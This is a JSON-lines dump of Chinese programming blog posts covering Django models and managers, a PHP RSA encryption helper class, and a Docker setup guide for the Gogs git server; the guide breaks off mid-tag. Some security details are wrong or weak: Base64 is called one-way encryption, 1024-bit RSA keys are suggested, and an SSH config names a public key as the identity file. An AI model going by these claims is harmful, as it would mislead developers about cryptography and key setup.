{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 定义模型2.1", "log_Intro": "Django 定义模型2.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"定义模型\">定义模型</h1>\n\n<ul><li>在模型中定义属性，会生成表中的字段</li>\n\t<li>django根据属性的类型确定以下信息：\n\t<ul><li>当前选择的数据库支持字段的类型</li>\n\t\t<li>渲染管理表单时使用的默认html控件</li>\n\t\t<li>在管理站点最低限度的验证</li>\n\t</ul></li>\n\t<li>django会为表增加自动增长的主键列，每个模型只能有一个主键列，如果使用选项设置某属性为主键列后，则django不会再生成默认的主键列</li>\n\t<li>属性命名限制\n\t<ul><li>不能是python的保留关键字</li>\n\t\t<li>由于django的查询方式，不允许使用连续的下划线</li>\n\t</ul></li>\n</ul><h1 id=\"定义属性\">定义属性</h1>\n\n<ul><li>定义属性时，需要字段类型</li>\n\t<li>字段类型被定义在django.db.models.fields目录下，为了方便使用，被导入到django.db.models中</li>\n\t<li>使用方式\n\t<ol><li>导入from django.db import models</li>\n\t\t<li>通过models.Field创建字段类型的对象，赋值给属性</li>\n\t</ol></li>\n\t<li><strong>对于重要数据都做逻辑删除，不做物理删除，实现方法是定义isDelete属性，类型为BooleanField，默认值为False</strong></li>\n</ul><p>字段类型</p>\n\n<ul><li>AutoField：一个根据实际ID自动增长的IntegerField，通常不指定\n\t<ul><li>如果不指定，一个主键字段将自动添加到模型中</li>\n\t</ul></li>\n\t<li>BooleanField：true/false 字段，此字段的默认表单控制是CheckboxInput</li>\n\t<li>NullBooleanField：支持null、true、false三种值</li>\n\t<li>CharField(max_length=字符长度)：字符串，默认的表单样式是 TextInput</li>\n\t<li>TextField：大文本字段，一般超过4000使用，默认的表单控件是Textarea</li>\n\t<li>IntegerField：整数</li>\n\t<li>DecimalField(max_digits=None, decimal_places=None)：使用python的Decimal实例表示的十进制浮点数\n\t<ul><li>DecimalField.max_digits：位数总数</li>\n\t\t<li>DecimalField.decimal_places：小数点后的数字位数</li>\n\t</ul></li>\n\t<li>FloatField：用Python的float实例来表示的浮点数</li>\n\t<li>DateField[auto_now=False, auto_now_add=False])：使用Python的datetime.date实例表示的日期\n\t<ul><li>参数DateField.auto_now：每次保存对象时，自动设置该字段为当前时间，用于\"最后一次修改\"的时间戳，它总是使用当前日期，默认为false</li>\n\t\t<li>参数DateField.auto_now_add：当对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前日期，默认为false</li>\n\t\t<li>该字段默认对应的表单控件是一个TextInput. 在管理员站点添加了一个JavaScript写的日历控件，和一个“Today\"的快捷按钮，包含了一个额外的invalid_date错误消息键</li>\n\t\t<li>auto_now_add, auto_now, and default 这些设置是相互排斥的，他们之间的任何组合将会发生错误的结果</li>\n\t</ul></li>\n\t<li>TimeField：使用Python的datetime.time实例表示的时间，参数同DateField</li>\n\t<li>DateTimeField：使用Python的datetime.datetime实例表示的日期和时间，参数同DateField</li>\n\t<li>FileField：一个上传文件的字段</li>\n\t<li>ImageField：继承了FileField的所有属性和方法，但对上传的对象进行校验，确保它是个有效的image</li>\n</ul><p>字段选项</p>\n\n<ul><li>通过字段选项，可以实现对字段的约束</li>\n\t<li>在字段对象时通过关键字参数指定</li>\n\t<li>null：如果为True，Django 将空值以NULL 存储到数据库中，默认值是 False</li>\n\t<li>blank：如果为True，则该字段允许为空白，默认值是 False</li>\n\t<li><strong>对比：null是数据库范畴的概念，blank是表单验证证范畴的</strong></li>\n\t<li>db_column：字段的名称，如果未指定，则使用属性的名称</li>\n\t<li>db_index：若值为 True, 则在表中会为此字段创建索引</li>\n\t<li>default：默认值</li>\n\t<li>primary_key：若为 True, 则该字段会成为模型的主键字段</li>\n\t<li>unique：如果为 True, 这个字段在表中必须有唯一值</li>\n</ul><p>关系</p>\n\n<ul><li>关系的类型包括\n\t<ul><li>ForeignKey：一对多，将字段定义在多的端中</li>\n\t\t<li>ManyToManyField：多对多，将字段定义在两端中</li>\n\t\t<li>OneToOneField：一对一，将字段定义在任意一端中</li>\n\t</ul></li>\n\t<li>可以维护递归的关联关系，使用'self'指定，详见“自关联”</li>\n\t<li>用一访问多：对象.模型类小写_set</li>\n</ul><pre class=\"has\">\n<code>bookinfo.heroinfo_set\n</code></pre>\n\n<ul><li>用一访问一：对象.模型类小写</li>\n</ul><pre class=\"has\">\n<code>heroinfo.bookinfo\n</code></pre>\n\n<ul><li>访问id：对象.属性_id</li>\n</ul><pre class=\"has\">\n<code>heroinfo.book_id\n</code></pre>\n\n<h1 id=\"元选项\">元选项</h1>\n\n<ul><li>在模型类中定义类Meta，用于设置元信息</li>\n\t<li>元信息db_table：定义数据表名称，推荐使用小写字母，数据表的默认名称</li>\n</ul><pre class=\"has\">\n<code>&lt;app_name&gt;_&lt;model_name&gt;\n</code></pre>\n\n<ul><li>ordering：对象的默认排序字段，获取对象的列表时使用，接收属性构成的列表</li>\n</ul><pre class=\"has\">\n<code>class BookInfo(models.Model):\n    ...\n    class Meta():\n        ordering = ['id']\n</code></pre>\n\n<ul><li>字符串前加-表示倒序，不加-表示正序</li>\n</ul><pre class=\"has\">\n<code>class BookInfo(models.Model):\n    ...\n    class Meta():\n        ordering = ['-id']\n</code></pre>\n\n<ul><li>排序会增加数据库的开销</li>\n</ul><h1 id=\"示例演示\">示例演示</h1>\n\n<ul><li>创建test2项目，并创建booktest应用，使用mysql数据库</li>\n\t<li>定义图书模型</li>\n</ul><pre class=\"has\">\n<code>class BookInfo(models.Model):\n    btitle = models.CharField(max_length=20)\n    bpub_date = models.DateTimeField()\n    bread = models.IntegerField(default=0)\n    bcommet = models.IntegerField(default=0)\n    isDelete = models.BooleanField(default=False)\n</code></pre>\n\n<ul><li>英雄模型</li>\n</ul><pre class=\"has\">\n<code>class HeroInfo(models.Model):\n    hname = models.CharField(max_length=20)\n    hgender = models.BooleanField(default=True)\n    isDelete = models.BooleanField(default=False)\n    hcontent = models.CharField(max_length=100)\n    hbook = models.ForeignKey('BookInfo')\n</code></pre>\n\n<ul><li>定义index、detail视图</li>\n\t<li>index.html、detail.html模板</li>\n\t<li>配置url，能够完成图书及英雄的展示</li>\n</ul><h1 id=\"测试数据\">测试数据</h1>\n\n<ul><li>模型BookInfo的测试数据</li>\n</ul><pre class=\"has\">\n<code>insert into booktest_bookinfo(btitle,bpub_date,bread,bcommet,isDelete) values\n('射雕英雄传','1980-5-1',12,34,0),\n('天龙八部','1986-7-24',36,40,0),\n('笑傲江湖','1995-12-24',20,80,0),\n('雪山飞狐','1987-11-11',58,24,0)\n</code></pre>\n\n<ul><li>模型HeroInfo的测试数据</li>\n</ul><pre class=\"has\">\n<code>insert into booktest_heroinfo(hname,hgender,hbook_id,hcontent,isDelete) values\n('郭靖',1,1,'降龙十八掌',0),\n('黄蓉',0,1,'打狗棍法',0),\n('黄药师',1,1,'弹指神通',0),\n('欧阳锋',1,1,'蛤蟆功',0),\n('梅超风',0,1,'九阴白骨爪',0),\n('乔峰',1,2,'降龙十八掌',0),\n('段誉',1,2,'六脉神剑',0),\n('虚竹',1,2,'天山六阳掌',0),\n('王语嫣',0,2,'神仙姐姐',0),\n('令狐冲',1,3,'独孤九剑',0),\n('任盈盈',0,3,'弹琴',0),\n('岳不群',1,3,'华山剑法',0),\n('东方不败',0,3,'葵花宝典',0),\n('胡斐',1,4,'胡家刀法',0),\n('苗若兰',0,4,'黄衣',0),\n('程灵素',0,4,'医术',0),\n('袁紫衣',0,4,'六合拳',0)</code></pre>\n                                    </div>", "log_PostTime": 1584891139, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 模型成员2.2", "log_Intro": "Django 模型成员2.2", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"类的属性\">类的属性</h1>\n\n<ul><li>objects：是Manager类型的对象，用于与数据库进行交互</li>\n\t<li>当定义模型类时没有指定管理器，则Django会为模型类提供一个名为objects的管理器</li>\n\t<li>支持明确指定模型类的管理器</li>\n</ul><pre class=\"has\">\n<code>class BookInfo(models.Model):\n    ...\n    books = models.Manager()\n</code></pre>\n\n<ul><li>当为模型类指定管理器后，django不再为模型类生成名为objects的默认管理器</li>\n</ul><p>管理器Manager</p>\n\n<ul><li>管理器是Django的模型进行数据库的查询操作的接口，Django应用的每个模型都拥有至少一个管理器</li>\n\t<li>自定义管理器类主要用于两种情况</li>\n\t<li>情况一：向管理器类中添加额外的方法：见下面“创建对象”中的方式二</li>\n\t<li>情况二：修改管理器返回的原始查询集：重写get_queryset()方法</li>\n</ul><pre class=\"has\">\n<code>class BookInfoManager(models.Manager):\n    def get_queryset(self):\n        return super(BookInfoManager, self).get_queryset().filter(isDelete=False)\nclass BookInfo(models.Model):\n    ...\n    books = BookInfoManager()\n</code></pre>\n\n<h1 id=\"创建对象\">创建对象</h1>\n\n<ul><li>当创建对象时，django不会对数据库进行读写操作</li>\n\t<li>调用save()方法才与数据库交互，将对象保存到数据库中</li>\n\t<li>使用关键字参数构造模型对象很麻烦，推荐使用下面的两种之式</li>\n\t<li>说明：<em> _init</em> _方法已经在基类models.Model中使用，在自定义模型中无法使用，</li>\n\t<li>方式一：在模型类中增加一个类方法</li>\n</ul><pre class=\"has\">\n<code>class BookInfo(models.Model):\n    ...\n    @classmethod\n    def create(cls, title, pub_date):\n        book = cls(btitle=title, bpub_date=pub_date)\n        book.bread=0\n        book.bcommet=0\n        book.isDelete = False\n        return book\n引入时间包：from datetime import *\n调用：book=BookInfo.create(\"hello\",datetime(1980,10,11));\n保存：book.save()\n</code></pre>\n\n<ul><li>方式二：在自定义管理器中添加一个方法</li>\n\t<li>在管理器的方法中，可以通过self.model来得到它所属的模型类</li>\n</ul><pre class=\"has\">\n<code>class BookInfoManager(models.Manager):\n    def create_book(self, title, pub_date):\n        book = self.model()\n        book.btitle = title\n        book.bpub_date = pub_date\n        book.bread=0\n        book.bcommet=0\n        book.isDelete = False\n        return book\n\nclass BookInfo(models.Model):\n    ...\n    books = BookInfoManager()\n调用：book=BookInfo.books.create_book(\"abc\",datetime(1980,1,1))\n保存：book.save()\n</code></pre>\n\n<ul><li>在方式二中，可以调用self.create()创建并保存对象，不需要再手动save()</li>\n</ul><pre class=\"has\">\n<code>class BookInfoManager(models.Manager):\n    def create_book(self, title, pub_date):\n        book = self.create(btitle = title,bpub_date = pub_date,bread=0,bcommet=0,isDelete = False)\n        return book\n\nclass BookInfo(models.Model):\n    ...\n    books = BookInfoManager()\n调用：book=Book.books.create_book(\"abc\",datetime(1980,1,1))\n查看：book.pk\n</code></pre>\n\n<h1 id=\"实例的属性\">实例的属性</h1>\n\n<ul><li>DoesNotExist：在进行单个查询时，模型的对象不存在时会引发此异常，结合try/except使用</li>\n</ul><h1 id=\"实例的方法\">实例的方法</h1>\n\n<ul><li>str (self)：重写object方法，此方法在将对象转换成字符串时会被调用</li>\n\t<li>save()：将模型对象保存到数据表中</li>\n\t<li>delete()：将模型对象从数据表中删除</li>\n</ul>                                    </div>", "log_PostTime": 1584891140, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP 使用非对称加密算法（RSA）", "log_Intro": "PHP 使用非对称加密算法（RSA）", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3><strong>加密的类型：</strong></h3>\n\n<pre>\n在日常设计及开发中，为确保数据传输和数据存储的安全，可通过特定的算法，将数据明文加密成复杂的密文。目前主流加密手段大致可分为单向加密和双向加密。\n\n单向加密：通过对数据进行摘要计算生成密文，密文不可逆推还原。算法代表：Base64，MD5，SHA; \n\n双向加密：与单向加密相反，可以把密文逆推还原成明文，双向加密又分为对称加密和非对称加密。\n\n对称加密：指数据使用者必须拥有相同的密钥才可以进行加密解密，就像彼此约定的一串暗号。算法代表：DES，3DES，AES，IDEA，RC4，RC5;\n\n非对称加密：相对对称加密而言，无需拥有同一组密钥，非对称加密是一种“信息公开的密钥交换协议”。非对称加密需要公开密钥和私有密钥两组密钥，公开密钥和私有密钥是配对起来的，\n也就是说使用公开密钥进行数据加密，只有对应的私有密钥才能解密。这两个密钥是数学相关，用某用户密钥加密后的密文，只能使用该用户的加密密钥才能解密。如果知道了其中一个，并\n不能计算出另外一个。因此如果公开了一对密钥中的一个，并不会危害到另外一个密钥性质。这里把公开的密钥为公钥，不公开的密钥为私钥。算法代表：RSA，DSA。\n</pre>\n\n<p>　　以前一直对客户端传给服务器的信息加密这一块一脸懵，如果app里面的用户登录信息被抓包拿到了，大写着 username:root，password:123456，  那不是很尴尬。</p>\n\n<p>偶然做版权输入的时候遇到了rsa，在支付宝支付的时候也接触过，当时不知道这是啥子，现在才知道。</p>\n\n<p>他能保证，客户端给出的信息，只有拥有私钥的服务器才能看，其他人看的都是乱码，嘿嘿。</p>\n\n<h3><strong>非对称加密算法</strong></h3>\n\n<pre>\n需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。\n公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；\n如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。\n因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。</pre>\n\n<p>注意以上的一个点，公钥加密的数据，只有对应的私钥才能解密</p>\n\n<p>在日常使用中是酱紫的：</p>\n\n<pre>\n将私钥private_key.pem用在服务器端，公钥发放给android跟ios等前端</pre>\n\n<p>客户端用公钥加密过后，数据只能被拥有唯一私钥的服务器看懂。</p>\n\n<h3><strong>具体实现：</strong></h3>\n\n<p>1、加密解密的第一步是生成公钥、私钥对，私钥加密的内容能通过公钥解密（反过来亦可以）</p>\n\n<pre>\n 1 下载开源RSA密钥生成工具openssl（通常Linux系统都自带该程序），解压缩至独立的文件夹，进入其中的bin目录，执行以下命令：\n 2 a、openssl genrsa -out rsa_private_key.pem 1024\n 3 b、openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM -nocrypt -out private_key.pem\n 4 c、openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem\n 5 \n 6 第一条命令生成原始 RSA私钥文件 rsa_private_key.pem\n 7 第二条命令将原始 RSA私钥转换为 pkcs8格式\n 8 第三条生成RSA公钥 rsa_public_key.pem\n 9 \n10 上面几个就可以看出：通过私钥能生成对应的公钥</pre>\n\n<p>也有一些网站提供生成rsa公钥私钥的服务：http://www.bm8.com.cn/webtool/rsa/</p>\n\n<p>2、PHP的加密解密类库：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n\n\nclass Rsa {\n \n    /**     \n     * 获取私钥     \n     * @return bool|resource     \n     */    \n    private static function getPrivateKey() \n    {        \n        $abs_path = dirname(__FILE__) . '/rsa_private_key.pem';\n        $content = file_get_contents($abs_path);    \n        return openssl_pkey_get_private($content);    \n    }    \n\n    /**     \n     * 获取公钥     \n     * @return bool|resource     \n     */    \n    private static function getPublicKey()\n    {   \n        $abs_path = dirname(__FILE__) . '/rsa_public_key.pem';\n        $content = file_get_contents($abs_path);    \n        return openssl_pkey_get_public($content);     \n    }\n\n    /**     \n     * 私钥加密     \n     * @param string $data     \n     * @return null|string     \n     */    \n    public static function privEncrypt($data = '')    \n    {        \n        if (!is_string($data)) {            \n            return null;       \n        }        \n        return openssl_private_encrypt($data,$encrypted,self::getPrivateKey()) ? base64_encode($encrypted) : null;    \n    }    \n\n    /**     \n     * 公钥加密     \n     * @param string $data     \n     * @return null|string     \n     */    \n    public static function publicEncrypt($data = '')   \n    {        \n        if (!is_string($data)) {            \n            return null;        \n        }        \n        return openssl_public_encrypt($data,$encrypted,self::getPublicKey()) ? base64_encode($encrypted) : null;    \n    }    \n\n    /**     \n     * 私钥解密     \n     * @param string $encrypted     \n     * @return null     \n     */    \n    public static function privDecrypt($encrypted = '')    \n    {        \n        if (!is_string($encrypted)) {            \n            return null;        \n        }        \n        return (openssl_private_decrypt(base64_decode($encrypted), $decrypted, self::getPrivateKey())) ? $decrypted : null;    \n    }    \n\n    /**     \n     * 公钥解密     \n     * @param string $encrypted     \n     * @return null     \n     */    \n    public static function publicDecrypt($encrypted = '')    \n    {        \n        if (!is_string($encrypted)) {            \n            return null;        \n        }        \n    return (openssl_public_decrypt(base64_decode($encrypted), $decrypted, self::getPublicKey())) ? $decrypted : null;    \n    }\n}</code></pre>\n\n<p> </p>\n\n<h3>调用demo：</h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n\nrequire_once \"Rsa.php\";\n$rsa = new Rsa();\n$data['name'] = 'Tom';\n$data['age']  = '20';\n$privEncrypt = $rsa-&gt;privEncrypt(json_encode($data));\necho '私钥加密后:'.$privEncrypt.'&lt;br&gt;';\n\n$publicDecrypt = $rsa-&gt;publicDecrypt($privEncrypt);\necho '公钥解密后:'.$publicDecrypt.'&lt;br&gt;';\n\n$publicEncrypt = $rsa-&gt;publicEncrypt(json_encode($data));\necho '公钥加密后:'.$publicEncrypt.'&lt;br&gt;';\n\n$privDecrypt = $rsa-&gt;privDecrypt($publicEncrypt);\necho '私钥解密后:'.$privDecrypt.'&lt;br&gt;';</code></pre>\n\n<p> </p>\n\n<h3>代码截图实例:</h3>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvOTY1NTAzLzIwMTgxMC85NjU1MDMtMjAxODEwMTMyMjQyMzQ5MTQtODE1MTkxOTU5LnBuZw?x-oss-process=image/format,png\"></p>\n                                    </div>", "log_PostTime": 1584891141, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "用gogs搭建属于自己的git网站", "log_Intro": "用gogs搭建属于自己的git网站", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <blockquote>\n<ul><li>如果你对docker的操作不太了解, 建议先阅读 <a href=\"https://www.jianshu.com/p/2d9d4cdd3af7\" rel=\"nofollow\">从零搭建docker私有仓库</a></li>\n\t<li>gogs是一款极易搭建的自助 Git 服务, 掌握了它, 我们就可以搭建自己的git服务站点</li>\n\t<li>gogs官网: <a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Fgogs.io%2F\" rel=\"nofollow\">https://gogs.io/</a>, github中文地址:<a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgogs%2Fgogs%2Fblob%2Fmaster%2FREADME_ZH.md\" rel=\"nofollow\">https://github.com/gogs/gogs/blob/master/README_ZH.md</a></li>\n</ul></blockquote>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWY1YWJlOWQ3OWMzOTczNGQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n\n<h2>实验环境:</h2>\n\n<ul><li>腾讯云 centos 7</li>\n</ul><h2>安装docker</h2>\n\n<pre class=\"has\">\n<code># 通过yum源安装docker\nyum -y install docker\n# 启动docker\nsystemctl start docker\n# 开机自启\nsudo systemctl enable docker\n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTIwMGU1NGE1MmY4OTk5ZmIucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<h2>下载gogs的docker镜像</h2>\n\n<pre class=\"has\">\n<code>docker pull gogs/gogs\n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTlkYTRmNDBjNDY1ZDYyZWUucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<h2>创建gogs存储的目录</h2>\n\n<pre class=\"has\">\n<code>mkdir -p /var/gogs\n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTJiYmM1ODIwMTY4M2JiMDgucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<h2>运行镜像, 产生容器</h2>\n\n<pre class=\"has\">\n<code>docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n</code></pre>\n\n<ul><li>在后台运行(2019年8月2日更新)</li>\n</ul><pre class=\"has\">\n<code>docker run --name=gogs -d  -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWE1NTg1Y2JhOTc0MzFmMTAucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<h2>配置</h2>\n\n<blockquote>\n<p>通过浏览器访问<code>公网ip地址:10080</code></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWUwM2ZhNTlhNDcyOWRjZTMucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n<br>\n按照图中内容填写参数\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTcwOWNkNTZjNjFiMTJiZDcucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n</blockquote>\n\n<h2>在新搭建的站点上, 创建新仓库</h2>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWE4Yjg2ZGQwOGVlNDgxOGIucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>配置仓库信息</li>\n</ul><blockquote>\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTdkOGQ4YTMxM2FiYzEyZTkucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n<br>\n如果配置过程中,你的gogs的docker环境挂掉了,可以使用<code>docker start gogs</code> 重新开启gogs\n\n<p> </p>\n</blockquote>\n\n<p>通过http方式获取仓库(简单易行)</p>\n\n<ul><li>复制http连接需要的相关参数</li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLThkZTBmMjQxOGI0YzYwMWUucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>在命令行通过http方式获取新创建的仓库<code>zhaoolee-test-gogs</code>, 并完成一次push操作</li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWFiYjgwM2IxODA5YmM1MTQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>验证提交成功</li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLThiYzhiZmM1YWMzM2QzNjIucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<p>测试用ssh方式链接仓库(有点麻烦, 需要添加秘钥, 可以跳过)</p>\n\n<ul><li>用户设置-&gt;账户设置-&gt;ssh秘钥</li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTQ4Mjc2NjBiN2UwNjU4N2UucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>通过rsa算法产生一对秘钥</li>\n</ul><pre class=\"has\">\n<code> ssh-keygen -t rsa -C \"zhaoolee@gmail.com\"\n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWEzYWNjMzc5NmYyZTNjMWYucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>将新的秘钥对添加到ssh</li>\n</ul><pre class=\"has\">\n<code>ssh-add ~/.ssh/zhaoolee_gmail\n</code></pre>\n\n<ul><li>在<code>~/.ssh/</code>下新建config, 并在config内指明秘钥<code>zhaoolee-gmail</code>对应的<code>域名</code>或<code>ip地址</code></li>\n</ul><pre class=\"has\">\n<code># gitlab\nHost 111.230.254.173\n    PreferredAuthentications publickey\n    IdentityFile ~/.ssh/zhaoolee_gmail.pub\n# github\nHost github.com\n    HostName github.com\n    PreferredAuthentications publickey\n    IdentityFile ~/.ssh/id_rsa.pub\n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWYzZDM0YmMwNzE2ZWNiODgucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<p>将公钥<code>zhaoolee_gmail.pub</code>添加到仓库</p>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWJmZDA5NmMxNWMzOGNkYmMucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<h2>复制ssh连接仓库需要的参数</h2>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" 